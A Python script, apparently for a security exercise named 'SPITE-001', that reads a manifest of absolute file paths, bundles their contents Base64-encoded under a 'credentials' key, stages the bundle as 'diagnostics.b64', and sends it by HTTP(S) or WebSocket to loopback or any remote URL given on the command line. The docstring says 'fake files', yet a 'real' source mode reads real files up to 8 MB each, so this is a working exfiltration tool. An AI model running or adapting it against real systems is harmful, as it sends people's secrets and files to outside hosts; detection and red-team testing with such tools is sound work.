#!/usr/bin/env python3
"""Read fake files, create a Base64 bundle, and optionally send it to a receiver."""
import argparse
import base64
from datetime import datetime, timezone
import hashlib
import http.client
import json
import os
import re
import socket
import ssl
import stat
import struct
from pathlib import Path
import tempfile
import urllib.parse
import uuid

MARKER = "SPITE-001"
MAX_FILE_BYTES = 65536
MAX_REAL_FILE_BYTES = 8 * 1024 * 1024
MAX_HARVEST_BYTES = 8 * 1024 * 1024
MAX_FILES = 32
DEFAULT_PORTS = {"http": 80, "https": 443, "ws": 80, "wss": 443}
WEBSOCKET_TIMEOUT = 5


def load_manifest(filename):
    data = json.loads(Path(filename).read_text(encoding="utf-8"))
    return validate_manifest(data)


def manifest_source(data):
    """Return "synthetic" or "real"; accept the legacy mock_files_only marker."""
    source = data.get("source")
    if source is None:
        source = "synthetic" if data.get("mock_files_only") is True else None
    if source not in ("synthetic", "real"):
        raise ValueError("Manifest must identify synthetic or real source files")
    return source


def validate_manifest(data):
    if data.get("exercise") != MARKER:
        raise ValueError("Manifest must identify this exercise")
    manifest_source(data)
    entries = data.get("files")
    if not isinstance(entries, list) or not 1 <= len(entries) <= MAX_FILES:
        raise ValueError("Manifest requires 1 to 32 exact files")
    seen = set()
    for entry in entries:
        path = entry["path"]
        if not Path(path).is_absolute() or any(c in path for c in "*?[]<>"):
            raise ValueError("Use absolute file paths; no globs or placeholders")
        if path in seen or ".." in Path(path).parts or str(Path(path)) != path:
            raise ValueError("Duplicate or noncanonical path")
        seen.add(path)
        if not re.fullmatch(r"[0-9a-f]{64}", entry["sha256"]):
            raise ValueError("Each file needs its pre-exercise SHA-256")
    return entries


def read_fixture(path, max_bytes=MAX_FILE_BYTES):
    # Walk every component without following links so a parent cannot be swapped
    # between a path check and the final open.
    path = Path(path)
    if not path.is_absolute() or not path.name:
        raise ValueError("Expected an absolute file path")
    directory_flags = os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW
    parent_fd = os.open(path.anchor, directory_flags)
    try:
        for component in path.parts[1:-1]:
            next_fd = os.open(component, directory_flags, dir_fd=parent_fd)
            os.close(parent_fd)
            parent_fd = next_fd
        fd = os.open(path.name, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK, dir_fd=parent_fd)
        with os.fdopen(fd, "rb") as stream:
            info = os.fstat(stream.fileno())
            if not stat.S_ISREG(info.st_mode) or info.st_size > max_bytes:
                raise ValueError("Expected a regular file of at most {} bytes".format(max_bytes))
            content = stream.read(max_bytes + 1)
            if len(content) > max_bytes:
                raise ValueError("File grew beyond the size limit")
            return content
    finally:
        os.close(parent_fd)


def parse_destination(url):
    """Validate an operator-provided receiver URL and split it into parts."""
    if not isinstance(url, str) or not url or any(not 0x20 < ord(c) < 0x7F for c in url):
        raise ValueError("Destination must be a printable http, https, ws, or wss URL")
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in DEFAULT_PORTS:
        raise ValueError("Destination scheme must be http, https, ws, or wss")
    if not parsed.hostname or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("Destination needs a host without credentials or fragments")
    try:
        port = parsed.port
    except ValueError:
        raise ValueError("Destination port is not a valid number")
    if port is None:
        port = DEFAULT_PORTS[parsed.scheme]
    if not 1 <= port <= 65535:
        raise ValueError("Destination port must be between 1 and 65535")
    path = parsed.path or "/"
    if not path.startswith("/"):
        raise ValueError("Destination path must start with /")
    if parsed.query:
        path += "?" + parsed.query
    return {"scheme": parsed.scheme, "host": parsed.hostname, "port": port, "path": path}


def connect_host(parts):
    # http.client and the WebSocket handshake need bracketed IPv6 literals.
    return "[" + parts["host"] + "]" if ":" in parts["host"] else parts["host"]


def send_http(parts, body):
    # One POST; no redirects, no proxy environment; https verifies certificates.
    if parts["scheme"] == "https":
        connection = http.client.HTTPSConnection(parts["host"], parts["port"], timeout=5)
    else:
        connection = http.client.HTTPConnection(parts["host"], parts["port"], timeout=5)
    try:
        connection.request("POST", parts["path"], body=body, headers={
            "Content-Type": "application/octet-stream",
            "X-SPITE-Exercise": MARKER,
        })
        response = connection.getresponse()
        if response.status != 204:
            raise RuntimeError("Receiver returned HTTP status " + str(response.status))
        expected = hashlib.sha256(body).hexdigest()
        if response.getheader("X-SPITE-Receipt") != expected:
            raise RuntimeError("Receiver did not acknowledge the bundle digest")
        return response.status, expected
    finally:
        connection.close()


def apply_mask(data, mask):
    if not data:
        return b""
    repeated = (mask * ((len(data) + 3) // 4))[:len(data)]
    return (int.from_bytes(data, "big") ^ int.from_bytes(repeated, "big")).to_bytes(len(data), "big")


def websocket_frame(opcode, payload):
    # Client-to-server frames must be masked (RFC 6455 section 5.3).
    length = len(payload)
    if length < 126:
        header = struct.pack("!BB", 0x80 | opcode, 0x80 | length)
    elif length < 65536:
        header = struct.pack("!BBH", 0x80 | opcode, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x80 | opcode, 0x80 | 127, length)
    mask = os.urandom(4)
    return header + mask + apply_mask(payload, mask)


def read_websocket_handshake(connection, expected_accept):
    head = bytearray()
    while b"\r\n\r\n" not in head:
        chunk = connection.recv(1)
        if not chunk:
            raise OSError("Receiver closed during the handshake")
        head += chunk
        if len(head) > 8192:
            raise ValueError("Oversized handshake response")
    lines = head.decode("ascii", "replace").split("\r\n")
    fields = lines[0].split()
    if len(fields) < 2 or not fields[1].isdigit():
        raise ValueError("Malformed handshake response")
    headers = {}
    for line in lines[1:]:
        if ":" in line:
            name, value = line.split(":", 1)
            headers[name.strip().lower()] = value.strip()
    status = int(fields[1])
    if (status != 101 or headers.get("upgrade", "").lower() != "websocket"
            or "upgrade" not in headers.get("connection", "").lower()
            or headers.get("sec-websocket-accept") != expected_accept):
        raise RuntimeError("Receiver did not complete a valid WebSocket upgrade")
    return status


def receive_exact(connection, length):
    data = bytearray()
    while len(data) < length:
        chunk = connection.recv(length - len(data))
        if not chunk:
            raise OSError("Receiver closed before acknowledging the bundle")
        data.extend(chunk)
    return bytes(data)


def read_websocket_acknowledgement(connection, expected_digest):
    first, second = receive_exact(connection, 2)
    if (first & 0x0F) not in (0x1, 0x2) or not (first & 0x80) or (second & 0x80):
        raise ValueError("Unexpected WebSocket acknowledgement frame")
    length = second & 0x7F
    if length == 126:
        length = int.from_bytes(receive_exact(connection, 2), "big")
    elif length == 127:
        length = int.from_bytes(receive_exact(connection, 8), "big")
    if length > 1024:
        raise ValueError("Oversized WebSocket acknowledgement")
    acknowledgement = json.loads(receive_exact(connection, length))
    if acknowledgement != {"marker": MARKER, "sha256": expected_digest}:
        raise RuntimeError("Receiver did not acknowledge the bundle digest")


def send_websocket(parts, body):
    # Minimal RFC 6455 client: one upgrade, one masked binary frame, then close.
    # wss verifies certificates with the default TLS context.
    connection = socket.create_connection((parts["host"], parts["port"]), timeout=WEBSOCKET_TIMEOUT)
    try:
        if parts["scheme"] == "wss":
            context = ssl.create_default_context()
            connection = context.wrap_socket(connection, server_hostname=parts["host"])
        authority = connect_host(parts)
        if parts["port"] != DEFAULT_PORTS[parts["scheme"]]:
            authority += ":" + str(parts["port"])
        key = base64.b64encode(os.urandom(16)).decode("ascii")
        expected_accept = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")
        ).digest()).decode("ascii")
        request = "\r\n".join([
            "GET {} HTTP/1.1".format(parts["path"]),
            "Host: " + authority,
            "Upgrade: websocket",
            "Connection: Upgrade",
            "Sec-WebSocket-Key: " + key,
            "Sec-WebSocket-Version: 13",
            "", "",
        ]).encode("ascii")
        connection.sendall(request)
        status = read_websocket_handshake(connection, expected_accept)
        connection.sendall(websocket_frame(0x2, body))
        digest = hashlib.sha256(body).hexdigest()
        read_websocket_acknowledgement(connection, digest)
        connection.sendall(websocket_frame(0x8, b""))
        return status, digest
    finally:
        connection.close()


def run(manifest, send_loopback=False, send_to=None):
    if send_loopback and send_to:
        raise ValueError("Choose one transfer option: --send-loopback or --send-to")
    destination = str(send_to) if send_to else ("http://127.0.0.1:8765/spite" if send_loopback else None)
    parts = parse_destination(destination) if destination else None
    document = json.loads(Path(manifest).read_text(encoding="utf-8"))
    source = manifest_source(document)
    entries = validate_manifest(document)
    run_id = str(uuid.uuid4())
    root = Path(tempfile.mkdtemp(prefix="spite-"))
    events = root / "events.jsonl"

    def emit(event, **details):
        record = dict(marker=MARKER, run_id=run_id,
                      timestamp=datetime.now(timezone.utc).isoformat(),
                      event=event, pid=os.getpid(), ppid=os.getppid(), **details)
        line = json.dumps(record, sort_keys=True)
        with events.open("a", encoding="utf-8") as stream:
            stream.write(line + "\n")
        print(line, flush=True)

    emit("execution_started", artifact_directory=str(root))
    collected = {}
    rejected = 0
    file_limit = MAX_REAL_FILE_BYTES if source == "real" else MAX_FILE_BYTES
    total_bytes = 0
    for entry in entries:
        path = entry["path"]
        emit("fixture_read_attempt", path=path)
        try:
            content = read_fixture(path, file_limit)
        except FileNotFoundError:
            emit("fixture_missing", path=path)
            rejected += 1
            continue
        except (OSError, ValueError) as exc:
            emit("fixture_unavailable", path=path, error=str(exc))
            rejected += 1
            continue
        if hashlib.sha256(content).hexdigest() != entry["sha256"]:
            emit("fixture_mismatch", path=path)
            rejected += 1
            continue
        if total_bytes + len(content) > MAX_HARVEST_BYTES:
            emit("fixture_total_exceeded", path=path, bytes=len(content))
            rejected += 1
            continue
        total_bytes += len(content)
        collected[path] = base64.b64encode(content).decode("ascii")
        emit("fixture_read", path=path, bytes=len(content))
    if rejected:
        emit("execution_incomplete", rejected_files=rejected)
        return 2
    payload = json.dumps(dict(marker=MARKER, run_id=run_id, source=source,
                              content_encoding="base64",
                              credentials=collected), sort_keys=True).encode()
    encoded = base64.b64encode(payload)
    stage = root / "diagnostics.b64"
    with stage.open("xb") as stream:
        stream.write(encoded)
    emit("bundle_staged", path=str(stage), bytes=len(encoded),
         sha256=hashlib.sha256(encoded).hexdigest())
    if parts:
        # No redirects, no proxy environment; the destination is recorded in the events.
        emit("transfer_attempt", destination=destination)
        try:
            if parts["scheme"] in ("http", "https"):
                status, receipt_digest = send_http(parts, encoded)
            else:
                status, receipt_digest = send_websocket(parts, encoded)
            emit("transfer_acknowledged", status=status, sha256=receipt_digest)
        except (OSError, ValueError, http.client.HTTPException, RuntimeError) as exc:
            emit("transfer_failed", error=str(exc))
            return 1
    emit("execution_completed",
         mode="loopback" if send_loopback else ("remote" if send_to else "offline"))
    return 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--manifest", required=True, help="Prepared fake-file manifest")
    transfer = parser.add_mutually_exclusive_group()
    transfer.add_argument("--send-loopback", action="store_true",
                          help="Send the bundle to the receiver at 127.0.0.1:8765")
    transfer.add_argument("--send-to", dest="send_to", metavar="URL",
                          help="Send the bundle to an http, https, ws, or wss receiver URL")
    args = parser.parse_args()
    raise SystemExit(run(args.manifest, args.send_loopback, args.send_to))
